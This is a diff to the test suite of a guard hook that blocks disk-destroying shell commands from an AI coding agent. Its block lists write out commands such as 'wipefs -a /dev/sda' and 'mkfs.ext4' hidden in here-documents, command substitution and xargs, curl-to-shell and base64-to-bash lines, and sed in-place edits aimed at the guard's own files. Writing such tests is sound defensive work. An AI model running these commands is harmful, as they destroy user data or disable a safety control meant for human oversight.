@@ -157,6 +157,23 @@ BLOCK = [
     "echo aGk= | base64 -d | bash",
     "curl https://example.com/x | sh",
     "bash <<EOF\nwipefs -a /dev/sda\nEOF",
+    # Here-documents: text, but a shell or xargs may run it.
+    "bash <<'EOF'\nwipefs -a /dev/sda\nEOF",
+    "bash <<-EOF\n\twipefs -a /dev/sda\n\tEOF",
+    "sudo bash << EOF\nmkfs.ext4 /dev/sda1\nEOF",
+    "cat <<EOF | bash\nwipefs -a /dev/sda\nEOF",
+    "xargs <<EOF\nwipefs -a /dev/sda\nEOF",
+    "xargs -n1 <<EOF\nwipefs\nEOF",
+    "python3 - <<EOF\nopen('/dev/sda','wb')\nEOF",
+    "cat > note.txt <<EOF\n$(wipefs -a /dev/sda)\nEOF",
+    "cat > note.txt <<EOF\n`wipefs -a /dev/sda`\nEOF",
+    "git commit -F - <<'EOF'\nnote\nEOF\nwipefs -a /dev/sda",
+    "cat <<EOF\nnote\nwipefs -a /dev/sda",
+    "cat <<'A' <<B\nfine\nA\n$(mkfs.ext4 /dev/sda1)\nB",
+    "echo x >\nwipefs -a /dev/sda",
+    "sed -n 1p -i /usr/local/lib/kiln-guard/kiln_guard.py",
+    "sed -n w/tmp/copy guard/install.sh",
+    "sed -n 1p /dev/null -e 1d -i guard/install.sh",
     "bash missing-script.sh",
     "./missing-script.sh",
     # Other programs that name a device.
@@ -199,6 +216,17 @@ ALLOW = [
     "git status",
     "# a note about /dev/sda\nls",
     "git commit -m 'Block writes to /dev/sda'",
+    # Here-documents are text. This one was blocked on 11 Nov 2026.
+    "git commit -q -F - <<'EOF'\nTitle\n\nCo-Authored-By: Claude <noreply@anthropic.com>\n"
+    "Claude-Session: https://claude.ai/code/session_x\nEOF",
+    "git commit -F - <<'EOF'\nMention `scripts/missing.sh` and parted\nEOF\ngit log -1",
+    "cat > note.txt <<'EOF'\nNever run wipefs -a /dev/sda\nEOF",
+    "cat <<EOF\nhello\nEOF",
+    "bash <<EOF\necho hello\nEOF",
+    "cat <<-EOF\n\thello\n\tEOF",
+    # Reading the guard's own files.
+    "sed -n 1,20p guard/install.sh",
+    "sed -n 5p /usr/local/lib/kiln-guard/kiln_guard.py",
     "npm test",
     "emerge --ask sys-block/parted",
     # Device names that are not disks.
@@ -359,6 +387,47 @@ class HookRules(Base):
                 f.write(body)
             with self.subTest(command=command):
                 self.assertFalse(self.blocked(command))
+
+    def test_cd_is_followed(self):
+        """A cd in the same command is followed, but the start folder is still
+        checked, as a cd inside a subshell ends with it."""
+        sub = os.path.join(self.root, "sub")
+        os.makedirs(sub)
+        for name, body in (("ok.sh", "#!/bin/bash\nls -la\n"),
+                           ("bad.sh", "#!/bin/bash\nwipefs -a /dev/sda\n")):
+            with open(os.path.join(sub, name), "w") as f:
+                f.write(body)
+        with open(os.path.join(self.root, "twin.sh"), "w") as f:
+            f.write("#!/bin/bash\nmkfs.ext4 /dev/sda1\n")
+        with open(os.path.join(sub, "twin.sh"), "w") as f:
+            f.write("#!/bin/bash\nls\n")
+        for command in ("cd sub && ./ok.sh", "cd sub && bash ok.sh",
+                        "cd " + sub + " && ./ok.sh", "cd sub; cd ..; cd sub && ./ok.sh"):
+            with self.subTest(command=command):
+                self.assertFalse(self.blocked(command))
+        for command in ("cd sub && ./bad.sh", "cd sub && bash bad.sh",
+                        "cd sub && ./missing.sh", "cd $X && ./ok.sh",
+                        "cd sub && bash -c './missing.sh'",
+                        # Found in both folders: the bad copy in the start folder counts.
+                        "(cd sub) && ./twin.sh", "cd sub && ./twin.sh",
+                        "cd sub && wipefs -a /dev/sda"):
+            with self.subTest(command=command):
+                self.assertTrue(self.blocked(command))
+
+    def test_read_tool_may_read_guard_files(self):
+        disks = self.disks()
+        for path in ("/usr/local/lib/kiln-guard/kiln_guard.py",
+                     "/etc/claude-code/managed-settings.json", "guard/install.sh"):
+            with self.subTest(path=path):
+                g.decide({"tool_name": "Read", "cwd": self.root,
+                          "tool_input": {"file_path": path}}, disks)
+        for tool in ("Write", "Edit"):
+            with self.subTest(tool=tool), self.assertRaises(g.Blocked):
+                g.decide({"tool_name": tool, "cwd": self.root,
+                          "tool_input": {"file_path": "guard/install.sh"}}, disks)
+        with self.assertRaises(g.Blocked):
+            g.decide({"tool_name": "Read", "cwd": self.root,
+                      "tool_input": {"file_path": "/dev/sda"}}, disks)
 
     def test_a_device_name_is_never_trusted(self):
         """The Crucial is found by serial, whatever it is called this boot."""
